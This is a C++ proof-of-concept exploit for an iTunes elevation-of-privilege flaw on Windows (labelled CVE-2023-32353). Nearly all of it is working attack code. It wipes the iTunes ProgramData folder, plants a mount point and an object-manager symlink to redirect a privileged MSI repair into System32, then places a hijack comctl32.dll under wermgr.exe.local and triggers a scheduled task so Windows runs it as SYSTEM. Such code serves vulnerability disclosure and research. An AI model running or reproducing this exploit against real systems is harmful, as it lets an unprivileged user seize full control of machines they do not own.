#include "stdafx.h"
#include <CommonUtils.h>
#include <FileSymlink.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "atlbase.h"
#include <ReparsePoint.h>
#include <Shlwapi.h>
#include <iostream>
#include <fileapi.h>
#include <strsafe.h>
#include <tchar.h>
#include <Winuser.h> 
#include <wchar.h>
#include <msi.h>
#include <msiquery.h>


#pragma comment(lib, "Shlwapi.lib")

using namespace std;

LPCWSTR MusicPlayerAppPath = L"C:\\ProgramData\\Apple Computer\\iTunes";

int createSymlinks()
{
	printf("\nCreating MountPoint from Music Player Application to RPC Control!");
	if (!ReparsePoint::CreateMountPoint(MusicPlayerAppPath, L"\\RPC Control", L""))
	{
		printf("\nError: Unable to create mount point. - %ls\n", GetErrorMessage().c_str());
		return 0;
	}

	printf("\nCreating Symlink from RPC Control\SC Info to wermgr.exe.local!\n");
	LPCTSTR SCInfo = TEXT("\\RPC Control\\SC Info");
	LPCTSTR wermgrloc = TEXT("\\??\\C:\\Windows\\System32\\wermgr.exe.local");

	HANDLE symlink = nullptr;
	symlink = ::CreateSymlink(nullptr, SCInfo, wermgrloc);
	Sleep(1000);
	if (!symlink)
	{
		DWORD errorCode = GetLastError();
		if (errorCode == 183) {
			printf("\nSymlink already exists. Trying to further execute, even though the execution might fail.");
		}
		else {
			printf("\nError creating symlink - %ls\n", GetErrorMessage().c_str());
			return 0;
		}
	}

	return 1;

}



int processWermgrFolder() {
	//Adapted from github.com/binderlabs/DirCreate2System
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind;
	hFind = FindFirstFile(L"C:\\Windows\\WinSxS\\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6*", &FindFileData);
	wchar_t CommonControlsFolder[MAX_PATH];
	wmemcpy(CommonControlsFolder, FindFileData.cFileName, wcslen(FindFileData.cFileName));
	CommonControlsFolder[wcslen(FindFileData.cFileName)] = L'\0'; // Ensure null termination
	FindClose(hFind);

	wchar_t subFolderPath[MAX_PATH];
	StringCchCopy(subFolderPath, MAX_PATH, L"C:\\Windows\\System32\\wermgr.exe.local\\");
	StringCchCat(subFolderPath, MAX_PATH, CommonControlsFolder);

	if (!CreateDirectoryW(subFolderPath, NULL))
	{
		wprintf(L"\nError: Unable to create directory: %ls", subFolderPath);
		return 0;
	}

	{
		wprintf(L"\n[+] Successfully created directory: %ls", subFolderPath);
	}


	wchar_t comctlPath[MAX_PATH];
	StringCchCopy(comctlPath, MAX_PATH, subFolderPath);
	StringCchCat(comctlPath, MAX_PATH, L"\\comctl32.dll");


	//Move dll into the subfolder (amd64_microsoft.windows.common-controls_...) of the wermgr.exe.local folder
	if (!CopyFileW(L"comctl32.dll", comctlPath, true)){
		printf("\nUnable to move comctl32.dll into the subfolder of wermgr.exe.local");
		return 0;
	}
	else {
		printf("\nSuccessfully moved comctl32.dll into the subfolder of wermgr.exe.local");
		Sleep(1000);
	}

	printf("\nRunning QueueReporting so that wermgr.exe gets executed...");
	system("schtasks.exe /Run /TN \"\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\"");

	return 1;
}

int msiRepairMusicPlayer() {
	//Find the first folder inside the Music Player Application Installer Cache folder
	const wchar_t* rootFolderPath = L"C:\\ProgramData\\Apple Computer\\Installer Cache";

	// Create the search pattern to find the first subfolder
	wchar_t searchPattern[MAX_PATH];
	wcscpy_s(searchPattern, MAX_PATH, rootFolderPath);
	wcscat_s(searchPattern, MAX_PATH, L"\\*");

	// Find the first subfolder
	WIN32_FIND_DATA findData;
	HANDLE hFind = FindFirstFile(searchPattern, &findData);
	wchar_t firstSubfolderPath[MAX_PATH];
	if (hFind != INVALID_HANDLE_VALUE)
	{
		// Iterate through each item in the directory
		do
		{
			// Check if the current item is a directory
			if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				// Exclude "." and ".." directories
				if (wcscmp(findData.cFileName, L".") != 0 && wcscmp(findData.cFileName, L"..") != 0)
				{
					// Get the path to the first subfolder
					wcscpy_s(firstSubfolderPath, MAX_PATH, rootFolderPath);
					wcscat_s(firstSubfolderPath, MAX_PATH, L"\\");
					wcscat_s(firstSubfolderPath, MAX_PATH, findData.cFileName);
					break; // Exit the loop after finding the first valid directory
				}
			}
		} while (FindNextFile(hFind, &findData));

		// Close the search handle
		FindClose(hFind);
	}

	//Path to MSI
	wchar_t musicPlayerMsiLoc[MAX_PATH];
	wcscpy_s(musicPlayerMsiLoc, MAX_PATH, firstSubfolderPath);
	wcscat_s(musicPlayerMsiLoc, MAX_PATH, L"\\iTunes64.msi");

	//Print Music Player MSI Location
	wprintf(L"\nMusic Player Application MSI Location: %ls", musicPlayerMsiLoc);

	LPCWSTR msiFilePath = musicPlayerMsiLoc;

	printf("\nTrying to force MSI repair against Music Player Application...");

	LPCWSTR parameters = L"/f /i /norestart";
	SHELLEXECUTEINFOW executeInfo = {};
	executeInfo.cbSize = sizeof(SHELLEXECUTEINFOW);
	executeInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	executeInfo.lpVerb = L"open";
	executeInfo.lpFile = L"msiexec.exe";

	// Build the command-line string for MSI repair
	wchar_t commandLine[MAX_PATH + 100];
	swprintf_s(commandLine, MAX_PATH + 100, L"/fa \"%s\"", msiFilePath);

	executeInfo.lpParameters = commandLine;
	executeInfo.lpDirectory = L"";
	executeInfo.nShow = SW_SHOW;

	if (ShellExecuteExW(&executeInfo))
	{
		WaitForSingleObject(executeInfo.hProcess, INFINITE);
		CloseHandle(executeInfo.hProcess);
		return 1;
	}

	return 1;


}

void deleteContentsMusicPlayerApp(const std::wstring& folderPath)
{
	WIN32_FIND_DATAW findData;
	HANDLE hFind;

	std::wstring searchPath = folderPath + L"\\*";
	hFind = FindFirstFileW(searchPath.c_str(), &findData);

	if (hFind != INVALID_HANDLE_VALUE)
	{
		do
		{
			if (wcscmp(findData.cFileName, L".") != 0 && wcscmp(findData.cFileName, L"..") != 0)
			{
				std::wstring filePath = folderPath + L"\\" + findData.cFileName;

				if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					deleteContentsMusicPlayerApp(filePath);
					RemoveDirectoryW(filePath.c_str());
				}
				else
				{
					DeleteFileW(filePath.c_str());
				}
			}
		} while (FindNextFileW(hFind, &findData));

		FindClose(hFind);
	}
}


int _tmain(int argc, _TCHAR* argv[])
{
	//Delete contents of Music Player Application folder
	printf("Removing contents of Music Player Application folder...");
	std::wstring folderPath = L"C:\\ProgramData\\Apple Computer\\iTunes";
	deleteContentsMusicPlayerApp(folderPath);


	//Create symlinks
	printf("\nCreating symlinks...");
	if (!createSymlinks()) {
		printf("\nExploit failed because the symlinks could not be created.");
	}
	else {
		//Force MSI repair
		msiRepairMusicPlayer();


		//This part is not specific to CVE-2023-32353. It is just here to complete the EoP (Elevation of Privilege) Poc (Proof of Concept)
		//Create contents of wermgr.exe.local folder and move comctl32.dll
		printf("\nCreating contents of wermgr.exe.local folder...");
		if (!processWermgrFolder()) {
			printf("\nExploit failed because the wermgr.exe.local technique was mitigated.");
		}
		else {
			printf("\nExploit successful.");
		}
	}

}